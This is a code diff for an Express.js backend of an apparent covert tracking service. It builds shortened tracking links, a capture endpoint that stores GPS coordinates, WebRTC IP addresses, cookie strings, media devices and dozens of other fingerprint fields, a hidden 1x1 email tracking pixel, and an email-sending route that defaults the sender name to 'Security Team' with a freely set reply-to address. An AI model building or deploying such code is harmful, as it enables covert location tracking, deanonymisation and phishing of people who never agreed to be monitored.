@@ -1,5 +1,6 @@
 import express from "express";
 import axios from "axios";
+import nodemailer from "nodemailer";
 import { createTrackingLink, recordCapture, addCredits, createPixel, recordPixelHit } from "../utils/linkService.js";
 import { db } from "../firebase/config.js";
 
@@ -40,9 +41,6 @@ function getClientIP(req) {
     return req.socket?.remoteAddress || req.ip || "Unknown";
 }
 
-// -- PIXEL ROUTES ? add these at the bottom ------------------------------------
-
-// Detect email client from User-Agent
 function parseEmailClient(ua = "") {
     if (/Googlebot|Google-Apps-Script/i.test(ua)) return "Gmail";
     if (/Outlook|microsoft.outlook/i.test(ua)) return "Outlook";
@@ -105,8 +103,10 @@ async function enrichIP(ip) {
     } catch { return {}; }
 }
 
+// -- HEALTH --------------------------------------------------------------------
 router.get("/health", (_req, res) => res.status(200).json({ ok: true }));
 
+// -- CREATE TRACKING LINK ------------------------------------------------------
 router.post("/shorten", async(req, res) => {
     try {
         const { uid, label, destinationUrl } = req.body;
@@ -120,6 +120,7 @@ router.post("/shorten", async(req, res) => {
     }
 });
 
+// -- CAPTURE DEVICE DATA -------------------------------------------------------
 router.post("/capture", async(req, res) => {
     try {
         const body = req.body;
@@ -137,7 +138,6 @@ router.post("/capture", async(req, res) => {
 
         const deviceData = {
             ip,
-            // IP Location
             country: ipData.country || null,
             countryCode: ipData.countryCode || null,
             region: ipData.region || null,
@@ -153,7 +153,6 @@ router.post("/capture", async(req, res) => {
             isProxy: ipData.isProxy || null,
             isHosting: ipData.isHosting || null,
             isMobileNetwork: ipData.isMobileNetwork || null,
-            // GPS
             gpsLat: body.gpsLat || null,
             gpsLon: body.gpsLon || null,
             gpsAccuracy: body.gpsAccuracy || null,
@@ -165,7 +164,6 @@ router.post("/capture", async(req, res) => {
             gpsState: geoData.gpsState || null,
             gpsPincode: geoData.gpsPincode || null,
             gpsCountry: geoData.gpsCountry || null,
-            // Device & Browser
             browser: parseBrowser(ua),
             os: parseOS(ua),
             device: parseDevice(ua),
@@ -185,7 +183,6 @@ router.post("/capture", async(req, res) => {
             deviceModel: body.deviceModel || null,
             webdriver: body.webdriver || null,
             automationDetected: body.automationDetected || null,
-            // Hardware
             cpuCores: body.cpuCores || null,
             ram: body.ram || null,
             memoryTier: body.memoryTier || null,
@@ -199,7 +196,6 @@ router.post("/capture", async(req, res) => {
             javaEnabled: body.javaEnabled ?? null,
             pdfViewerEnabled: body.pdfViewerEnabled ?? null,
             gamepadsConnected: body.gamepadsConnected || null,
-            // GPU & WebGL
             gpu: body.gpu || null,
             gpuVendor: body.gpuVendor || null,
             webglVersion: body.webglVersion || null,
@@ -225,7 +221,6 @@ router.post("/capture", async(req, res) => {
             webglExtensionsCount: body.webglExtensionsCount || null,
             webglExtensionsList: body.webglExtensionsList || null,
             webgl2Support: body.webgl2Support ?? null,
-            // Screen & Display
             screenWidth: body.screenWidth || null,
             screenHeight: body.screenHeight || null,
             screenAvailWidth: body.screenAvailWidth || null,
@@ -254,7 +249,6 @@ router.post("/capture", async(req, res) => {
             visualViewportWidth: body.visualViewportWidth ?? null,
             visualViewportHeight: body.visualViewportHeight ?? null,
             visualViewportScale: body.visualViewportScale ?? null,
-            // Battery & Connection
             batteryLevel: body.batteryLevel ?? null,
             batteryCharging: body.batteryCharging ?? null,
             batteryChargingTime: body.batteryChargingTime ?? null,
@@ -267,7 +261,6 @@ router.post("/capture", async(req, res) => {
             connectionDownlinkMax: body.connectionDownlinkMax || null,
             onlineStatus: body.onlineStatus || null,
             browserOnline: body.browserOnline || null,
-            // Time & Locale
             localTime: body.localTime || null,
             clientTimezone: body.clientTimezone || null,
             timezoneOffset: body.timezoneOffset ?? null,
@@ -276,7 +269,6 @@ router.post("/capture", async(req, res) => {
             timeOfDay: body.timeOfDay || null,
             language: body.language || null,
             languages: body.languages || null,
-            // Privacy & Fingerprint
             incognito: body.incognito ?? null,
             adBlockDetected: body.adBlockDetected ?? null,
             cookiesEnabled: body.cookiesEnabled ?? null,
@@ -297,7 +289,6 @@ router.post("/capture", async(req, res) => {
             cookieString: body.cookieString || null,
             scrollPositionX: body.scrollPositionX ?? null,
             scrollPositionY: body.scrollPositionY ?? null,
-            // NEW ? deviceinfo.me fields
             deviceMotionSupport: body.deviceMotionSupport || null,
             deviceOrientationSupport: body.deviceOrientationSupport || null,
             deviceMotionAccelX: body.deviceMotionAccelX ?? null,
@@ -320,23 +311,19 @@ router.post("/capture", async(req, res) => {
             storageQuota: body.storageQuota || null,
             storageUsage: body.storageUsage || null,
             storageUsageBytes: body.storageUsageBytes ?? null,
-            // WebRTC
             webrtcLocalIP: body.webrtcLocalIP || null,
             webrtcPublicIP: body.webrtcPublicIP || null,
             webrtcSupport: body.webrtcSupport || null,
-            // Media
             cameras: body.cameras ?? null,
             microphones: body.microphones ?? null,
             speakers: body.speakers ?? null,
             speechVoicesCount: body.speechVoicesCount ?? null,
             speechVoices: body.speechVoices || null,
-            // Storage
             localStorageEnabled: body.localStorageEnabled ?? null,
             sessionStorageEnabled: body.sessionStorageEnabled ?? null,
             indexedDBEnabled: body.indexedDBEnabled ?? null,
             cacheAPIEnabled: body.cacheAPIEnabled || null,
             cookiesCount: body.cookiesCount ?? null,
-            // Performance
             pageLoadTime: body.pageLoadTime || null,
             domContentLoaded: body.domContentLoaded || null,
             dnsLookupTime: body.dnsLookupTime || null,
@@ -345,14 +332,11 @@ router.post("/capture", async(req, res) => {
             memoryUsed: body.memoryUsed || null,
             memoryTotal: body.memoryTotal || null,
             memoryLimit: body.memoryLimit || null,
-            // Fonts & Plugins
             fontsDetected: body.fontsDetected ?? null,
             fontsList: body.fontsList || null,
-            fontFingerprint: body.fontFingerprint || null,
             pluginsCount: body.pluginsCount ?? null,
             plugins: body.plugins || null,
             mimeTypes: body.mimeTypes || null,
-            // Permissions
             geolocationPermission: body.geolocationPermission || null,
             notificationsPermission: body.notificationsPermission || null,
             notificationPermission: body.notificationPermission || null,
@@ -364,7 +348,6 @@ router.post("/capture", async(req, res) => {
             clipboardReadPermission: body.clipboardReadPermission || null,
             clipboardWritePermission: body.clipboardWritePermission || null,
             keyboardLayout: body.keyboardLayout || null,
-            // Features
             webSocketSupport: body.webSocketSupport ?? null,
             webWorkerSupport: body.webWorkerSupport ?? null,
             serviceWorkerSupport: body.serviceWorkerSupport ?? null,
@@ -419,6 +402,7 @@ router.post("/capture", async(req, res) => {
     }
 });
 
+// -- GPS UPDATE ----------------------------------------------------------------
 router.post("/capture-gps", async(req, res) => {
     try {
         const { token, gpsLat, gpsLon, gpsAccuracy, gpsAltitude, gpsSpeed, gpsHeading } = req.body;
@@ -452,13 +436,12 @@ router.post("/capture-gps", async(req, res) => {
     }
 });
 
+// -- URL SHORTENER -------------------------------------------------------------
 router.post("/shorten-url", async(req, res) => {
     try {
         const { url, provider } = req.body;
         if (!url) return res.status(400).json({ error: "url required" });
-        console.log(`[shorten-url] provider=${provider}`);
         let shortUrl = null;
-
         if (provider === "tinyurl") {
             const r = await axios.get("https://tinyurl.com/api-create.php?url=" + encodeURIComponent(url), { timeout: 10000 });
             const result = String(r.data || "").trim();
@@ -475,25 +458,22 @@ router.post("/shorten-url", async(req, res) => {
             const r = await axios.get("https://da.gd/shorten?url=" + encodeURIComponent(url), { timeout: 10000, headers: { "User-Agent": "Mozilla/5.0" } });
             const result = String(r.data || "").trim();
             if (result.startsWith("http")) shortUrl = result;
-        } else if (provider === "linkshrink") {
-            const r = await axios.post("https://linkshrink.dev/api/v1/shorten", { url }, { timeout: 10000, headers: { "Content-Type": "application/json" } });
-            if (r.data?.data?.shortUrl) shortUrl = r.data.data.shortUrl;
         }
-
-        console.log(`[shorten-url] final=${shortUrl}`);
         return res.status(200).json({ shortUrl });
     } catch (err) {
-        console.error("[shorten-url] ERROR:", err.message);
+        console.error("[shorten-url]", err.message);
         return res.status(200).json({ shortUrl: null, error: err.message });
     }
 });
 
+// -- GEO IP --------------------------------------------------------------------
 router.get("/geo-ip", async(req, res) => {
     const ip = getClientIP(req);
     const data = await enrichIP(ip);
     return res.status(200).json(data);
 });
 
+// -- CREDITS -------------------------------------------------------------------
 router.post("/credits", async(req, res) => {
     try {
         const { uid, amount } = req.body;
@@ -505,7 +485,9 @@ router.post("/credits", async(req, res) => {
     }
 });
 
-// POST /api/pixel/create ? create a new pixel tracker
+// -- PIXEL ROUTES --------------------------------------------------------------
+// IMPORTANT: specific routes (/pixel/create, /pixel/list) MUST come before /pixel/:filename
+
 router.post("/pixel/create", async(req, res) => {
     try {
         const { uid, label } = req.body;
@@ -518,7 +500,6 @@ router.post("/pixel/create", async(req, res) => {
     }
 });
 
-// GET /api/pixel/list/:uid ? get all pixels for a user
 router.get("/pixel/list/:uid", async(req, res) => {
     try {
         const { uid } = req.params;
@@ -527,6 +508,105 @@ router.get("/pixel/list/:uid", async(req, res) => {
         pixels.sort((a, b) => (b.createdAt?.toMillis?.() ?? 0) - (a.createdAt?.toMillis?.() ?? 0));
         return res.status(200).json({ pixels });
     } catch (err) {
+        return res.status(500).json({ error: err.message });
+    }
+});
+
+// GET /pixel/:filename — serves 1x1 transparent GIF + logs the hit
+router.get("/pixel/:filename", async(req, res) => {
+    // Serve pixel FIRST — instant response, no waiting
+    const GIF = Buffer.from("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7", "base64");
+    res.set({
+        "Content-Type": "image/gif",
+        "Content-Length": GIF.length,
+        "Cache-Control": "no-store, no-cache, must-revalidate, proxy-revalidate",
+        "Pragma": "no-cache",
+        "Expires": "0",
+    });
+    res.end(GIF);
+
+    // Log hit async after response sent
+    try {
+        const token = req.params.filename.replace(/\.(gif|png|jpg|jpeg)$/i, "");
+        const ua = req.headers["user-agent"] || "";
+        const ip = (() => {
+            const fwd = req.headers["x-forwarded-for"];
+            if (fwd) return fwd.split(",")[0].trim();
+            return req.socket?.remoteAddress || req.ip || "Unknown";
+        })();
+
+        let ipData = {};
+        try {
+            if (ip && ip !== "::1" && !ip.startsWith("127.") && !ip.startsWith("192.168.") && !ip.startsWith("10.")) {
+                const r = await axios.get(
+                    `http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting,mobile`, { timeout: 4000 }
+                );
+                if (r.data.status === "success") {
+                    ipData = {
+                        country: r.data.country || null,
+                        countryCode: r.data.countryCode || null,
+                        region: r.data.regionName || null,
+                        city: r.data.city || null,
+                        zip: r.data.zip || null,
+                        lat: r.data.lat || null,
+                        lon: r.data.lon || null,
+                        timezone: r.data.timezone || null,
+                        isp: r.data.isp || null,
+                        org: r.data.org || null,
+                        asn: r.data.as || null,
+                        isProxy: r.data.proxy || false,
+                        isHosting: r.data.hosting || false,
+                        isMobileNetwork: r.data.mobile || false,
+                    };
+                }
+            }
+        } catch { /* silent */ }
+
+        const hitData = {
+            ip,
+            emailClient: parseEmailClient(ua),
+            userAgent: ua,
+            os: parseOS(ua),
+            device: parseDevice(ua),
+            browser: parseBrowser(ua),
+            referer: req.headers["referer"] || req.headers["referrer"] || null,
+            acceptLanguage: req.headers["accept-language"] || null,
+            ...ipData,
+        };
+
+        recordPixelHit(token, hitData).catch(() => {});
+    } catch (err) {
+        console.error("[GET /pixel]", err.message);
+    }
+});
+
+// -- EMAIL SENDER --------------------------------------------------------------
+router.post("/send-email", async(req, res) => {
+    try {
+        const { fromName, fromEmail, toEmail, subject, htmlBody } = req.body;
+        if (!toEmail || !subject || !htmlBody) {
+            return res.status(400).json({ error: "toEmail, subject and htmlBody are required" });
+        }
+        if (!process.env.SMTP_USER || !process.env.SMTP_PASS) {
+            return res.status(500).json({ error: "SMTP not configured. Add SMTP_USER and SMTP_PASS to .env" });
+        }
+        const transporter = nodemailer.createTransport({
+            service: "gmail",
+            auth: {
+                user: process.env.SMTP_USER,
+                pass: process.env.SMTP_PASS,
+            },
+        });
+        await transporter.sendMail({
+            from: `"${fromName || "Security Team"}" <${process.env.SMTP_USER}>`,
+            replyTo: fromEmail || process.env.SMTP_USER,
+            to: toEmail,
+            subject: subject,
+            html: htmlBody,
+        });
+        return res.status(200).json({ success: true });
+    } catch (err) {
+        console.error("[send-email]", err.message);
         return res.status(500).json({ error: err.message });
     }
 });
